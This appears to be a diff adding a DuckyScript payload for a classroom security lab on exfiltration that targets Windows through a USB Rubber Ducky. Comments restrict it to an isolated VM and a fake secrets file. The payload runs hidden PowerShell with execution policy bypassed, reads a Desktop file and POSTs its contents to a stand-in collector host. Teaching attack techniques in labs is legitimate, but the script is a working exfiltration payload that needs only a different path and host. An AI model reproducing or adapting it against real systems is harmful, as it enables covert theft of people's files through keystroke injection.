@@ -1,0 +1,23 @@
+REM ============================================================
+REM Lab 12: Collection & Exfiltration
+REM Target: Windows 10/11, USB Rubber Ducky (DuckyScript 3.0)
+REM
+REM WARNING: Run only against an isolated, snapshotted VM.
+REM Point the URL below at a host on the lab's isolated network
+REM ONLY - see lab_collector.py and the README. Do not use a real
+REM internet address in classroom use.
+REM
+REM Prerequisite: a file named fake_secrets.txt containing obviously
+REM fake content must already exist on the victim's Desktop before
+REM this payload runs - see README "Setup".
+REM
+REM Effect: reads that file and POSTs its contents to the lab
+REM collector. Nothing is written to the victim machine - this
+REM payload only reads and sends.
+REM ============================================================
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "$d = Get-Content \"$env:USERPROFILE\Desktop\fake_secrets.txt\" -Raw; Invoke-WebRequest -Uri 'http://LAB-SERVER:8080/collect' -Method POST -Body $d -UseBasicParsing"
+ENTER
